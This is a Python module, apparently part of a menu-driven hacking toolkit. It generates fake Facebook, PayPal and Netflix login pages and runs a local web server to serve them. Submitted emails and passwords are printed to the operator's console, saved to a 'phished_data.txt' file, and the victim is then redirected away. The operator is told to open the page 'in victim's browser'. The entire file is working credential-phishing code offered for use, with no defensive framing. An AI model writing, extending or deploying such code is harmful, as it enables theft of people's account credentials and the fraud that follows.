import os
import time
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore, Style
from utils.texts import t
from utils.helpers import clear_screen

class PhishingHandler(BaseHTTPRequestHandler):
    page_content = ""
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(self.page_content.encode())
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f"{Fore.RED}\n[+] Captured data:{Style.RESET_ALL}\n{post_data.decode()}")
        
        with open("phished_data.txt", "a") as f:
            f.write(f"\n\n[{time.ctime()}] {post_data.decode()}")
        
        self.send_response(302)
        self.send_header('Location', 'https://example.com')
        self.end_headers()

def run_server(port, content):
    PhishingHandler.page_content = content
    httpd = HTTPServer(('0.0.0.0', port), PhishingHandler)
    print(f"{Fore.GREEN}[+] Phishing server running on port {port}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[+] Open http://{get_local_ip()}:{port} in victim's browser{Style.RESET_ALL}")
    httpd.serve_forever()

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def create_phishing_page(service):
    pages = {
        "facebook": '''<html><body>
        <h1>Facebook Login</h1>
        <form method="POST">
        <input type="text" name="email" placeholder="Email or phone"><br>
        <input type="password" name="pass" placeholder="Password"><br>
        <input type="submit" value="Log In">
        </form></body></html>''',
        
        "paypal": '''<html><body>
        <h1>PayPal Sign In</h1>
        <form method="POST">
        <input type="text" name="email" placeholder="Email"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <input type="submit" value="Log In">
        </form></body></html>''',
        
        "netflix": '''<html><body>
        <h1>Netflix Sign In</h1>
        <form method="POST">
        <input type="text" name="email" placeholder="Email"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <input type="submit" value="Sign In">
        </form></body></html>'''
    }
    return pages.get(service.lower(), "<html><body><h1>Login Page</h1></body></html>")

def phishing_menu():
    while True:
        clear_screen()
        print(f"\n{Fore.MAGENTA}{t('phishing_menu')}{Style.RESET_ALL}")
        print("01. Create Phishing Page")
        print("02. Start Phishing Server")
        print("00. Back")
        choice = input(t("choose"))
        
        if choice == '01': 
            service = input("> Service (facebook, paypal, netflix): ")
            page = create_phishing_page(service)
            filename = f"phish_{service}.html"
            with open(filename, "w") as f:
                f.write(page)
            print(f"{Fore.GREEN}[+] Page saved to {filename}{Style.RESET_ALL}")
            input(f"\n{t('press_enter')}")
            
        elif choice == '02':  
            port = int(input("> Port (8080): ") or 8080)
            service = input("> Service (facebook, paypal, netflix): ")
            page = create_phishing_page(service)
            print(f"{Fore.YELLOW}[+] Starting server...{Style.RESET_ALL}")
            server_thread = threading.Thread(target=run_server, args=(port, page), daemon=True)
            server_thread.start()
            input(f"\n{t('press_enter')} [Press Enter to stop server]")
            print(f"{Fore.YELLOW}[+] Server stopped{Style.RESET_ALL}")
            
        elif choice == '00':
            break
            
        else:
            print(t("error"))
            time.sleep(1)